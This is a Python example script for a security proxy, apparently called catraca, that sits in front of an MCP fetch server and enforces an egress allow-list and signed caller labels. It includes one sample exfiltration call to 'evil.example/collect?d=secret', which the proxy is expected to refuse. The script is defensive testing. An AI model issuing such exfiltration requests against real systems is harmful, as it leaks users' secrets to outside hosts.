"""The proxy in front of a server we didn't write: the reference MCP fetch server.

Run: pip install mcp mcp-server-fetch
     python -m examples.mcp_proxy_fetch

An MCP client (the official SDK, as an agent would use it) starts the proxy,
the proxy starts the fetch server, and the client asks for two pages. The
client signs its labels, as an agent running catraca would, so the proxy
knows the URL came from the user. The egress rules allow example.com only.
The page on evil.example is refused by the proxy and never reaches the
server. The session keeps working, and the page on example.com comes back.

Set CATRACA_FETCH_SERVER to try another server command, e.g. "uvx mcp-server-fetch".
"""

import asyncio
import json
import os
import shlex
import sys
import tempfile
from pathlib import Path

from catraca import Caller
from catraca.adapters.mcp import META_KEY, sign_labels
from examples._common import check

KEY = os.urandom(32)  # shared by the agent and the proxy, from a secrets manager in real life

POLICY = {"version": 1, "tools": {"fetch": {
    "callers": {"tenants": ["acme"], "users": "*"},
    "args": {"url": {}, "max_length": {"integrity": "ANY"},
             "start_index": {"integrity": "ANY"}, "raw": {"integrity": "ANY"}}}}}
EGRESS = {"version": 1, "tools": {"fetch": {"hosts": ["example.com"]}}}


async def main() -> None:
    from mcp import ClientSession, StdioServerParameters
    from mcp.client.stdio import stdio_client
    from mcp.shared.exceptions import McpError

    server = shlex.split(os.environ.get("CATRACA_FETCH_SERVER", f"{sys.executable} -m mcp_server_fetch"))
    with tempfile.TemporaryDirectory() as d:
        Path(d, "policy.json").write_text(json.dumps(POLICY))
        Path(d, "egress.json").write_text(json.dumps(EGRESS))
        log = Path(d, "decisions.jsonl")
        params = StdioServerParameters(command=sys.executable, env={**os.environ, "LABEL_KEY": KEY.hex()}, args=[
            "-m", "catraca.adapters.mcp_proxy", "--policy", str(Path(d, "policy.json")),
            "--egress", str(Path(d, "egress.json")), "--tenant", "acme", "--user", "agent",
            "--evidence", str(log), "--label-key-env", "LABEL_KEY", "--", *server])

        def signed(args):
            return {META_KEY: sign_labels({k: "TRUSTED" if k == "url" else "UNTRUSTED" for k in args}, args, KEY,
                                          tool="fetch", caller=Caller("acme", "agent"))}

        async with stdio_client(params) as (read, write):
            async with ClientSession(read, write) as session:
                await session.initialize()
                tools = [t.name for t in (await session.list_tools()).tools]
                check("fetch" in tools, "the third-party server answered through the proxy")

                refused = None
                try:
                    bad = {"url": "https://evil.example/collect?d=secret"}
                    await session.call_tool("fetch", bad, meta=signed(bad))
                except McpError as exc:
                    refused = str(exc)
                check(refused is not None and "EGRESS_NOT_ALLOWED" in refused,
                      "a call to a host that isn't allowed is refused with the reason code")

                good = {"url": "https://example.com/", "max_length": 2000, "raw": True}
                ok = await session.call_tool("fetch", good, meta=signed(good))
                text = " ".join(getattr(c, "text", "") for c in ok.content)
                if ok.isError or "Example Domain" not in text:
                    print("server answered:", text[:500])
                check(not ok.isError and "Example Domain" in text,
                      "the same session still works, and an allowed page comes back")
        records = [json.loads(x) for x in log.read_text().splitlines()]
        check([r["verdict"] for r in records] == ["DENY", "ALLOW"], "both decisions are in the evidence log")


if __name__ == "__main__":
    asyncio.run(main())
